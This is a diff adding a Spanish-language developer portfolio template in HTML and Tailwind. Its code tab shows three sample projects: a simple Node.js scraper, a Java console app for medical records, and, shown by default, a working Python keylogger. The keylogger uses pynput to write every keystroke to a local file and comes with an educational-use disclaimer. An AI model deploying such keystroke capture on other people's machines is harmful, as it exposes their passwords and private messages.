@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="es" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tu Nombre - Portafolio Tecnológico</title>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Google Fonts: Inter -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;900&display=swap" rel="stylesheet">
+    
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    
+    <!-- Showdown.js for Markdown Rendering -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/showdown/2.1.0/showdown.min.js"></script>
+
+    <style>
+        /* Custom Styles */
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0a0a0a; /* Un negro ligeramente más suave */
+            color: #e5e7eb; /* Gris claro para el texto */
+        }
+        .section-title {
+            @apply text-3xl font-bold text-center mb-12 text-white;
+        }
+        .accent-color {
+            color: #38bdf8; /* Azul cielo como color de acento */
+        }
+        .card {
+            @apply bg-slate-900/50 backdrop-blur-sm border border-slate-800 rounded-xl p-6 shadow-lg transition-all duration-300 hover:border-sky-500 hover:shadow-sky-500/10;
+        }
+        .nav-link {
+            @apply px-4 py-2 rounded-md text-sm font-medium text-gray-300 hover:bg-slate-800 hover:text-white transition-colors;
+        }
+        
+        /* Estilos para la imagen de fondo del Hero */
+        #hero {
+            position: relative; /* Necesario para los pseudo-elementos */
+            overflow: hidden; /* Asegura que el blur no se salga */
+        }
+        #hero::before {
+            content: '';
+            position: absolute;
+            top: -5%; right: -5%; bottom: -5%; left: -5%; /* Evita bordes por el blur */
+            background: url('https://images.unsplash.com/photo-1550439062-609e1531270e?q=80&w=2070&auto=format&fit=crop') no-repeat center center/cover;
+            filter: blur(5px);
+            z-index: -2;
+        }
+        #hero::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-color: rgba(10, 10, 10, 0.7); /* Capa oscura semitransparente */
+            z-index: -1;
+        }
+
+        /* Estilo para la barra de scroll */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #1e293b;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #334155;
+        }
+        /* Contenedor responsivo para videos */
+        .video-container {
+            position: relative;
+            padding-bottom: 56.25%; /* Proporción 16:9 */
+            height: 0;
+            overflow: hidden;
+            border-radius: 0.5rem; /* rounded-lg */
+            background-color: #000; /* Fondo negro mientras carga el video */
+        }
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+    </style>
+</head>
+<body class="antialiased">
+
+    <!-- Header / Navbar -->
+    <header class="fixed top-0 left-0 right-0 z-50 bg-black/30 backdrop-blur-lg border-b border-slate-800">
+        <div class="container mx-auto px-6 py-3 flex justify-between items-center">
+            <a href="#" class="text-xl font-bold text-white">Tu Nombre</a>
+            <!-- CAMBIO AQUÍ: Aumentado el espacio entre elementos de 'space-x-2' a 'space-x-4' -->
+            <nav class="hidden md:flex items-center space-x-4">
+                <a href="#about" class="nav-link">Sobre mí</a>
+                <a href="#experience" class="nav-link">Experiencia</a>
+                <a href="#portfolio" class="nav-link">Portafolio</a>
+                <a href="#skills" class="nav-link">Habilidades</a>
+                <!-- CAMBIO AQUÍ: Aumentado el padding horizontal de 'px-4' a 'px-6' para darle más espacio -->
+                <a href="#contact" class="nav-link bg-sky-600 text-white hover:bg-sky-500 px-6">Contacto</a>
+            </nav>
+            <button id="mobile-menu-button" class="md:hidden text-white">
+                <i class="fas fa-bars fa-lg"></i>
+            </button>
+        </div>
+        <!-- Mobile Menu -->
+        <div id="mobile-menu" class="hidden md:hidden bg-slate-900">
+            <a href="#about" class="block py-2 px-4 text-sm hover:bg-slate-800">Sobre mí</a>
+            <a href="#experience" class="block py-2 px-4 text-sm hover:bg-slate-800">Experiencia</a>
+            <a href="#portfolio" class="block py-2 px-4 text-sm hover:bg-slate-800">Portafolio</a>
+            <a href="#skills" class="block py-2 px-4 text-sm hover:bg-slate-800">Habilidades</a>
+            <a href="#contact" class="block py-2 px-4 text-sm hover:bg-slate-800">Contacto</a>
+        </div>
+    </header>
+
+    <main class="pt-20">
+        <!-- Hero Section -->
+        <section id="hero" class="h-[calc(100vh-80px)] flex items-center justify-center text-center">
+            <div class="container mx-auto px-6 relative z-10">
+                <h1 class="text-5xl md:text-7xl font-black mb-4 text-white leading-tight">
+                    Desarrollador de Software <br/>& <span class="accent-color">Creador de Soluciones</span>
+                </h1>
+                <p class="text-lg md:text-xl text-gray-300 max-w-3xl mx-auto mb-8">
+                    Apasionado por construir aplicaciones robustas y escalables que resuelven problemas del mundo real.
+                </p>
+                <a href="#portfolio" class="bg-sky-600 text-white font-bold py-3 px-8 rounded-full hover:bg-sky-500 transition-transform duration-300 inline-block hover:scale-105">
+                    Ver mis proyectos
+                </a>
+            </div>
+        </section>
+
+        <!-- About Me -->
+        <section id="about" class="py-24">
+            <div class="container mx-auto px-6">
+                <h2 class="section-title">Sobre Mí</h2>
+                <div class="max-w-4xl mx-auto text-center text-gray-300 text-lg leading-relaxed">
+                    <p>
+                        ¡Hola! Soy [Tu Nombre], un desarrollador de software con [X] años de experiencia. Mi especialidad es el desarrollo [backend/frontend/full-stack] con un enfoque en crear código limpio, eficiente y mantenible. Me encanta aprender nuevas tecnologías y aplicarlas en proyectos desafiantes.
+                    </p>
+                    <p class="mt-4">
+                        Fuera del trabajo, disfruto de [Tu Hobby 1], [Tu Hobby 2] y contribuir a proyectos de código abierto. Siempre estoy buscando nuevas oportunidades para crecer y colaborar.
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Experience, Education, Courses (Timeline) -->
+        <section id="experience" class="py-24 bg-slate-900/40">
+            <div class="container mx-auto px-6">
+                <h2 class="section-title">Mi Trayectoria</h2>
+                <div class="relative max-w-5xl mx-auto mt-12">
+                    <!-- Timeline line -->
+                    <div class="absolute left-1/2 w-0.5 h-full bg-slate-700 -translate-x-1/2"></div>
+                    
+                    <!-- Timeline Items -->
+                    <div class="space-y-12">
+                        <!-- Experiencia Laboral -->
+                        <div class="relative">
+                            <div class="md:flex items-center md:space-x-8">
+                                <div class="md:w-1/2"></div>
+                                <div class="md:w-1/2">
+                                    <div class="card">
+                                        <p class="text-sky-400 font-semibold">Enero 2022 - Presente</p>
+                                        <h3 class="text-xl font-bold text-white mt-1">Desarrollador Full-Stack</h3>
+                                        <p class="text-gray-400 font-medium">Empresa Tecnológica S.A.</p>
+                                        <p class="text-gray-300 mt-3">Desarrollo y mantenimiento de aplicaciones web usando React, Node.js y PostgreSQL. Lideré la migración de un monolito a una arquitectura de microservicios.</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="absolute left-1/2 -translate-x-1/2 w-6 h-6 bg-slate-700 border-4 border-slate-900 rounded-full"></div>
+                        </div>
+
+                        <!-- Educación -->
+                        <div class="relative">
+                            <div class="md:flex flex-row-reverse items-center md:space-x-reverse md:space-x-8">
+                                <div class="md:w-1/2"></div>
+                                <div class="md:w-1/2">
+                                    <div class="card md:text-right">
+                                        <p class="text-sky-400 font-semibold">2018 - 2022</p>
+                                        <h3 class="text-xl font-bold text-white mt-1">Ingeniería en Sistemas</h3>
+                                        <p class="text-gray-400 font-medium">Universidad Nacional de Tecnología</p>
+                                        <p class="text-gray-300 mt-3">Graduado con honores. Proyecto final enfocado en Machine Learning para análisis de sentimiento.</p>
+                                    </div>
+                                </div>
+                            </div>
+                             <div class="absolute left-1/2 -translate-x-1/2 w-6 h-6 bg-slate-700 border-4 border-slate-900 rounded-full"></div>
+                        </div>
+
+                        <!-- Cursos y Diplomas -->
+                        <div class="relative">
+                            <div class="md:flex items-center md:space-x-8">
+                                <div class="md:w-1/2"></div>
+                                <div class="md:w-1/2">
+                                    <div class="card">
+                                        <p class="text-sky-400 font-semibold">2023</p>
+                                        <h3 class="text-xl font-bold text-white mt-1">Certificación en AWS Cloud Practitioner</h3>
+                                        <p class="text-gray-400 font-medium">Amazon Web Services</p>
+                                        <p class="text-gray-300 mt-3">Validación de conocimientos fundamentales sobre la nube de AWS y sus servicios principales.</p>
+                                    </div>
+                                </div>
+                            </div>
+                             <div class="absolute left-1/2 -translate-x-1/2 w-6 h-6 bg-slate-700 border-4 border-slate-900 rounded-full"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Portfolio Section -->
+        <section id="portfolio" class="py-24">
+            <div class="container mx-auto px-6">
+                <h2 class="section-title">Portafolio de Proyectos</h2>
+                
+                <!-- Tabs -->
+                <div class="flex justify-center mb-12 border-b border-slate-800">
+                    <button id="videos-tab" class="portfolio-tab active px-6 py-3 text-lg font-medium text-white border-b-2 border-sky-500">Videos</button>
+                    <button id="code-tab" class="portfolio-tab px-6 py-3 text-lg font-medium text-gray-400 border-b-2 border-transparent hover:text-white">Código</button>
+                </div>
+
+                <!-- Videos Content -->
+                <div id="videos-content">
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                        <!-- Video 1 -->
+                        <div class="card">
+                            <div class="video-container">
+                                <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+                            </div>
+                            <h3 class="text-xl font-bold mt-4 text-white">Demo de Proyecto E-commerce</h3>
+                            <p class="text-gray-400 mt-2">Un recorrido por las funcionalidades principales de una plataforma de comercio electrónico construida con MERN stack.</p>
+                        </div>
+                        <!-- Video 2 -->
+                        <div class="card">
+                            <div class="video-container">
+                                <iframe src="https://www.youtube.com/embed/videoseries?list=PLx0sYbCqOb8TBPRdmBHs5Iftvv9TPboYG" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+                            </div>
+                            <h3 class="text-xl font-bold mt-4 text-white">Tutorial de API REST con Express</h3>
+                            <p class="text-gray-400 mt-2">Explicación paso a paso sobre cómo construir una API RESTful desde cero utilizando Node.js y Express.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Code Content -->
+                <div id="code-content" class="hidden">
+                    <div class="flex flex-col md:flex-row gap-8">
+                        <!-- Project List -->
+                        <div class="w-full md:w-1/4">
+                            <div class="card p-4">
+                                <h3 class="font-bold text-white mb-4">Proyectos</h3>
+                                <ul id="project-list" class="space-y-2">
+                                    <li><a href="#" class="project-link block p-2 rounded-md hover:bg-slate-800 text-sky-400" data-project="project1">Keylogger en Python</a></li>
+                                    <li><a href="#" class="project-link block p-2 rounded-md hover:bg-slate-800 text-gray-300" data-project="project2">Web Scraper en JS</a></li>
+                                    <li><a href="#" class="project-link block p-2 rounded-md hover:bg-slate-800 text-gray-300" data-project="project3">App de Consola en Java</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                        <!-- Markdown Display -->
+                        <div class="w-full md:w-3/4">
+                            <div id="markdown-display" class="card prose prose-invert prose-pre:bg-slate-800 prose-pre:border prose-pre:border-slate-700 prose-headings:text-white max-w-none">
+                                <!-- Contenido Markdown se renderizará aquí -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="py-16 bg-black/20">
+            <div class="container mx-auto px-6 text-center">
+                <h3 class="text-2xl font-semibold text-white mb-4">¿Interesado en ver más de mi trabajo?</h3>
+                <p class="text-gray-400 max-w-xl mx-auto mb-8">
+                    Explora todos mis repositorios, contribuciones y proyectos personales directamente en mi perfil de GitHub.
+                </p>
+                <a href="https://github.com/tu-usuario" target="_blank" rel="noopener noreferrer" 
+                   class="inline-block text-white font-bold text-lg py-4 px-10 rounded-full
+                          bg-gradient-to-r from-sky-600 to-cyan-500 
+                          hover:from-sky-500 hover:to-cyan-400 
+                          transform hover:scale-105 transition-all duration-300 shadow-lg hover:shadow-cyan-500/50">
+                    <i class="fab fa-github mr-3"></i>
+                    Visitar mi GitHub
+                </a>
+            </div>
+        </section>
+
+        <!-- Skills Section -->
+        <section id="skills" class="py-24 bg-slate-900/40">
+            <div class="container mx-auto px-6">
+                <h2 class="section-title">Lenguajes y Frameworks</h2>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-12">
+                    <!-- Lenguajes -->
+                    <div>
+                        <h3 class="text-2xl font-bold text-center mb-8 text-white">Lenguajes de Programación</h3>
+                        <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-6 text-center">
+                            <div class="card p-4 flex flex-col items-center justify-center">
+                                <i class="fab fa-js-square fa-3x text-yellow-400"></i>
+                                <span class="mt-3 font-medium">JavaScript</span>
+                            </div>
+                             <div class="card p-4 flex flex-col items-center justify-center">
+                                <i class="fab fa-python fa-3x text-blue-400"></i>
+                                <span class="mt-3 font-medium">Python</span>
+                            </div>
+                             <div class="card p-4 flex flex-col items-center justify-center">
+                                <i class="fab fa-java fa-3x text-orange-500"></i>
+                                <span class="mt-3 font-medium">Java</span>
+                            </div>
+                             <div class="card p-4 flex flex-col items-center justify-center">
+                                <i class="fab fa-html5 fa-3x text-orange-600"></i>
+                                <span class="mt-3 font-medium">HTML5</span>
+                            </div>
+                             <div class="card p-4 flex flex-col items-center justify-center">
+                                <i class="fab fa-css3-alt fa-3x text-blue-500"></i>
+                                <span class="mt-3 font-medium">CSS3</span>
+                            </div>
+                            <div class="card p-4 flex flex-col items-center justify-center">
+                                <i class="fas fa-database fa-3x text-sky-400"></i>
+                                <span class="mt-3 font-medium">SQL</span>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- Frameworks -->
+                    <div>
+                        <h3 class="text-2xl font-bold text-center mb-8 text-white">Frameworks y Tecnologías</h3>
+                        <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-6 text-center">
+                            <div class="card p-4 flex flex-col items-center justify-center">
+                                <i class="fab fa-react fa-3x text-sky-400"></i>
+                                <span class="mt-3 font-medium">React</span>
+                            </div>
+                             <div class="card p-4 flex flex-col items-center justify-center">
+                                <i class="fab fa-node-js fa-3x text-green-500"></i>
+                                <span class="mt-3 font-medium">Node.js</span>
+                            </div>
+                             <div class="card p-4 flex flex-col items-center justify-center">
+                                <i class="fab fa-vuejs fa-3x text-green-400"></i>
+                                <span class="mt-3 font-medium">Vue.js</span>
+                            </div>
+                            <div class="card p-4 flex flex-col items-center justify-center">
+                                <i class="fas fa-bolt fa-3x text-purple-400"></i>
+                                <span class="mt-3 font-medium">Vite</span>
+                            </div>
+                             <div class="card p-4 flex flex-col items-center justify-center">
+                                <i class="fab fa-docker fa-3x text-blue-600"></i>
+                                <span class="mt-3 font-medium">Docker</span>
+                            </div>
+                             <div class="card p-4 flex flex-col items-center justify-center">
+                                <i class="fab fa-git-alt fa-3x text-red-500"></i>
+                                <span class="mt-3 font-medium">Git</span>
+                            </div>
+                            <div class="card p-4 flex flex-col items-center justify-center">
+                                <i class="fab fa-aws fa-3x text-yellow-500"></i>
+                                <span class="mt-3 font-medium">AWS</span>
+                            </div>
+                            <div class="card p-4 flex flex-col items-center justify-center">
+                                <!-- SVG Icon for Firebase -->
+                                <svg class="w-12 h-12 text-orange-400" role="img" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg" fill="currentColor">
+                                    <path d="M34.9 289.5l-34.9-192.2c-1.3-7.2 4.1-13.8 11.3-15.1s13.8 4.1 15.1 11.3L61.2 281.3 96 262.3 61.1 70.1c-1.3-7.2 4.1-13.8 11.3-15.1s13.8 4.1 15.1 11.3L122.4 256l34.9-19.2-34.9-192.2c-1.3-7.2 4.1-13.8 11.3-15.1s13.8 4.1 15.1 11.3L198.7 236.8V64c0-8.8 7.2-16 16-16h32c8.8 0 16 7.2 16 16v172.8l29.9-16.4c7.2-4 16-1.3 20 5.9s1.3 16-5.9 20l-96 52.8c-7.2 4-16 1.3-20-5.9s-1.3-16 5.9-20l29.9-16.4L153.1 482.3c-1.3 7.2-7.9 12.1-15.1 10.8s-12.1-7.9-10.8-15.1L162.1 304 96 342.1l-29.9 16.4c-7.2 4-16 1.3-20-5.9s-1.3-16 5.9-20l96-52.8c7.2-4 16-1.3 20 5.9s1.3 16-5.9 20L122.2 320l-34.9 192.2c-1.3 7.2-7.9 12.1-15.1 10.8s-12.1-7.9-10.8-15.1L96.3 352 34.9 289.5z"/>
+                                </svg>
+                                <span class="mt-3 font-medium">Firebase</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Contact Section -->
+        <footer id="contact" class="py-16 bg-black">
+             <div class="container mx-auto px-6 text-center">
+                <h2 class="text-3xl font-bold text-white mb-4">Hablemos</h2>
+                <p class="text-gray-400 max-w-xl mx-auto mb-8">
+                    Estoy disponible para oportunidades freelance o roles a tiempo completo. Si tienes un proyecto en mente o simplemente quieres saludar, no dudes en contactarme.
+                </p>
+                <a href="mailto:tuemail@example.com" class="inline-block bg-slate-800 text-white font-bold py-3 px-6 rounded-lg hover:bg-slate-700 transition-colors">
+                    <i class="fas fa-envelope mr-2"></i> tuemail@example.com
+                </a>
+                <div class="flex justify-center space-x-6 mt-10">
+                    <a href="#" class="text-gray-400 hover:text-sky-400 transition-colors"><i class="fab fa-github fa-2x"></i></a>
+                    <a href="#" class="text-gray-400 hover:text-sky-400 transition-colors"><i class="fab fa-linkedin fa-2x"></i></a>
+                    <a href="#" class="text-gray-400 hover:text-sky-400 transition-colors"><i class="fab fa-twitter fa-2x"></i></a>
+                </div>
+                <p class="text-gray-500 text-sm mt-12">&copy; 2024 Tu Nombre. Todos los derechos reservados.</p>
+             </div>
+        </footer>
+    </main>
+
+    <script>
+        // --- Mobile Menu Toggle ---
+        const mobileMenuButton = document.getElementById('mobile-menu-button');
+        const mobileMenu = document.getElementById('mobile-menu');
+        mobileMenuButton.addEventListener('click', () => {
+            mobileMenu.classList.toggle('hidden');
+        });
+
+        // --- Portfolio Tabs Logic ---
+        const videosTab = document.getElementById('videos-tab');
+        const codeTab = document.getElementById('code-tab');
+        const videosContent = document.getElementById('videos-content');
+        const codeContent = document.getElementById('code-content');
+        const tabs = [videosTab, codeTab];
+        const contents = [videosContent, codeContent];
+
+        function switchTab(activeIndex) {
+            tabs.forEach((tab, index) => {
+                if (index === activeIndex) {
+                    tab.classList.add('text-white', 'border-sky-500');
+                    tab.classList.remove('text-gray-400', 'border-transparent');
+                    contents[index].classList.remove('hidden');
+                } else {
+                    tab.classList.remove('text-white', 'border-sky-500');
+                    tab.classList.add('text-gray-400', 'border-transparent');
+                    contents[index].classList.add('hidden');
+                }
+            });
+        }
+
+        videosTab.addEventListener('click', () => switchTab(0));
+        codeTab.addEventListener('click', () => switchTab(1));
+
+        // --- Markdown Rendering Logic ---
+        const markdownDisplay = document.getElementById('markdown-display');
+        const projectLinks = document.querySelectorAll('.project-link');
+        const showdownConverter = new showdown.Converter();
+
+        // Contenido de ejemplo para los proyectos en Markdown
+        const projects = {
+            project1: `
+# Keylogger Básico en Python
+
+Este proyecto es una implementación simple de un keylogger utilizando la librería \`pynput\` en Python. Un keylogger es una herramienta que registra las pulsaciones de teclas, a menudo de forma encubierta.
+
+**Descargo de responsabilidad:** Este código se proporciona únicamente con fines educativos. El uso de keyloggers sin el consentimiento explícito del propietario del sistema es ilegal y poco ético en la mayoría de las jurisdicciones.
+
+## Funcionalidad
+
+-   **Captura de Teclas:** Escucha y registra cada tecla que se presiona.
+-   **Almacenamiento en Archivo:** Guarda las pulsaciones de teclas en un archivo de texto (\`keylog.txt\`) para su posterior revisión.
+-   **Manejo de Teclas Especiales:** Registra teclas especiales como 'Espacio', 'Enter', 'Shift', etc., de una manera legible.
+
+## Requisitos
+
+Para que este script funcione, necesitas instalar la librería \`pynput\`. Puedes hacerlo con pip:
+
+\`\`\`bash
+pip install pynput
+\`\`\`
+
+## Código Fuente
+
+Aquí está el código completo del keylogger:
+
+\`\`\`python
+# Importar la librería necesaria de pynput
+from pynput.keyboard import Key, Listener
+
+# Ruta donde se guardará el archivo de registro
+log_file = "keylog.txt"
+
+def on_press(key):
+    """
+    Esta función se ejecuta cada vez que se presiona una tecla.
+    """
+    try:
+        # Intenta escribir la tecla presionada directamente
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        # Si es una tecla especial (como Shift, Ctrl, etc.)
+        with open(log_file, "a") as f:
+            # Reemplaza 'Key.space' por un espacio real para mayor legibilidad
+            if key == Key.space:
+                f.write(" ")
+            # Añade un salto de línea para 'Enter'
+            elif key == Key.enter:
+                f.write("\\n")
+            # De lo contrario, escribe el nombre de la tecla especial entre corchetes
+            else:
+                f.write(f" [{str(key)}] ")
+
+
+def on_release(key):
+    """
+    Esta función se ejecuta cuando se suelta una tecla.
+    En este caso, si se presiona la tecla 'Esc', el programa se detiene.
+    """
+    if key == Key.esc:
+        # Detiene el listener
+        return False
+
+# Iniciar el listener para que escuche los eventos del teclado
+print("Keylogger iniciado. Presiona 'Esc' para detener.")
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+print("Keylogger detenido. El registro se ha guardado en keylog.txt")
+\`\`\`
+`,
+            project2: `
+# Web Scraper con Node.js
+
+Este proyecto demuestra cómo construir un web scraper simple utilizando Node.js, junto con las librerías \`axios\` para realizar peticiones HTTP y \`cheerio\` para parsear y manipular el HTML recibido, de una manera similar a jQuery.
+
+## Funcionalidad
+
+- **Petición HTTP:** Realiza una petición GET a una URL para obtener su contenido HTML.
+- **Parseo de HTML:** Utiliza \`cheerio\` para cargar el HTML y poder seleccionarlo con selectores de CSS.
+- **Extracción de Datos:** Extrae los títulos de los artículos de una página de noticias de ejemplo.
+- **Muestra en Consola:** Imprime los títulos extraídos en la consola.
+
+## Requisitos
+
+Necesitarás Node.js instalado y las librerías \`axios\` y \`cheerio\`. Puedes instalarlas con npm:
+
+\`\`\`bash
+npm install axios cheerio
+\`\`\`
+
+## Código Fuente
+
+\`\`\`javascript
+const axios = require('axios');
+const cheerio = require('cheerio');
+
+// URL del sitio a scrapear
+const url = 'https://www.xataka.com/';
+
+async function scrapeData() {
+    try {
+        // Realizamos la petición a la web
+        const { data } = await axios.get(url);
+        // Cargamos el HTML en Cheerio
+        const $ = cheerio.load(data);
+
+        // Seleccionamos los elementos que contienen los títulos
+        const articleTitles = [];
+        $('.abstract-title a').each((index, element) => {
+            articleTitles.push($(element).text());
+        });
+
+        console.log('Títulos de los artículos extraídos:');
+        articleTitles.forEach((title, i) => {
+            console.log(\`\${i + 1}. \${title}\`);
+        });
+
+    } catch (error) {
+        console.error(\`Error al scrapear la web: \${error.message}\`);
+    }
+}
+
+scrapeData();
+\`\`\`
+`,
+            project3: `
+# App de Consola para Registros Médicos en Java
+
+Este es un ejemplo conceptual de una aplicación de línea de comandos (CLI) en Java para gestionar registros de consultas médicas. El objetivo es mostrar una estructura básica orientada a objetos y el manejo de archivos para la persistencia de datos.
+
+## Funcionalidad
+
+- **Crear Consulta:** Permite al usuario introducir datos para una nueva consulta (nombre del paciente, fecha, diagnóstico).
+- **Guardar en Archivo:** Serializa el objeto de la consulta y lo guarda en un archivo de texto (\`consultas.txt\`) de forma legible.
+- **Estructura OO:** Utiliza una clase \`Consulta\` para modelar los datos y una clase principal \`GestorConsultas\` para manejar la lógica de la aplicación.
+
+## Estructura del Proyecto
+
+El proyecto se organizaría con las siguientes clases:
+
+- \`Consulta.java\`: Clase POJO (Plain Old Java Object) para representar los datos de una consulta.
+- \`GestorConsultas.java\`: Contiene el método \`main\` y la lógica para interactuar con el usuario y escribir en el archivo.
+
+## Código Fuente de Ejemplo
+
+\`\`\`java
+// Archivo: Consulta.java
+import java.io.Serializable;
+
+public class Consulta implements Serializable {
+    private String nombrePaciente;
+    private String fecha;
+    private String diagnostico;
+
+    // Constructor, Getters y Setters...
+
+    @Override
+    public String toString() {
+        return "Consulta {" +
+                "Paciente='" + nombrePaciente + '\\'' +
+                ", Fecha='" + fecha + '\\'' +
+                ", Diagnóstico='" + diagnostico + '\\'' +
+                '}';
+    }
+}
+
+// Archivo: GestorConsultas.java
+import java.io.FileWriter;
+import java.io.IOException;
+import java.io.PrintWriter;
+import java.util.Scanner;
+
+public class GestorConsultas {
+    public static void main(String[] args) {
+        Scanner scanner = new Scanner(System.in);
+        System.out.println("--- Nuevo Registro de Consulta Médica ---");
+
+        System.out.print("Nombre del paciente: ");
+        String paciente = scanner.nextLine();
+
+        System.out.print("Fecha (DD/MM/AAAA): ");
+        String fecha = scanner.nextLine();
+
+        System.out.print("Diagnóstico: ");
+        String diagnostico = scanner.nextLine();
+
+        // Crear una nueva instancia de Consulta (suponiendo que la clase existe)
+        // Consulta nuevaConsulta = new Consulta(paciente, fecha, diagnostico);
+
+        try (FileWriter fw = new FileWriter("consultas.txt", true);
+             PrintWriter pw = new PrintWriter(fw)) {
+            
+            // pw.println(nuevaConsulta.toString());
+            pw.println("Consulta {Paciente='" + paciente + "', Fecha='" + fecha + "', Diagnóstico='" + diagnostico + "'}");
+            System.out.println("Registro guardado exitosamente en consultas.txt");
+
+        } catch (IOException e) {
+            System.err.println("Error al guardar el registro: " + e.getMessage());
+        } finally {
+            scanner.close();
+        }
+    }
+}
+\`\`\`
+`
+        };
+
+        function loadProject(projectId) {
+            const markdownText = projects[projectId] || '<p>Selecciona un proyecto para ver los detalles.</p>';
+            const html = showdownConverter.makeHtml(markdownText);
+            markdownDisplay.innerHTML = html;
+
+            // Actualizar el estilo del enlace activo
+            projectLinks.forEach(link => {
+                if (link.dataset.project === projectId) {
+                    link.classList.add('text-sky-400', 'bg-slate-800');
+                    link.classList.remove('text-gray-300');
+                } else {
+                    link.classList.remove('text-sky-400', 'bg-slate-800');
+                    link.classList.add('text-gray-300');
+                }
+            });
+        }
+
+        // Cargar el primer proyecto por defecto
+        document.addEventListener('DOMContentLoaded', () => {
+            loadProject('project1');
+        });
+
+        // Añadir listeners a los enlaces de los proyectos
+        projectLinks.forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                const projectId = e.target.dataset.project;
+                loadProject(projectId);
+            });
+        });
+    </script>
+</body>
+</html>
